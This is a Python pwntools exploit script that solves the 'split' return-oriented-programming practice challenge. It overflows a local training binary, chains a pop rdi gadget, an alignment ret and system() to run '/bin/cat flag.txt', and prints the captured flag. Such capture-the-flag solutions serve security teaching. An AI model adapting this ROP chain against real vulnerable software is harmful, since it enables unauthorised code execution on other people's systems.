from pwn import *

BINARY = "./split"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "amd64"
context.binary = BINARY

p = process(BINARY)

rop = b"A" * 40
rop += p64(0x4007c3) # pop rdi ; ret
rop += p64(0x601060) # address of "/bin/cat flag.txt"
rop += p64(0x40053e) # ret --> MOVAPS issue
rop += p64(ELF.symbols["system"])

log.success(f"ROP chain : {rop}")

p.recv()
p.sendline(rop)

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
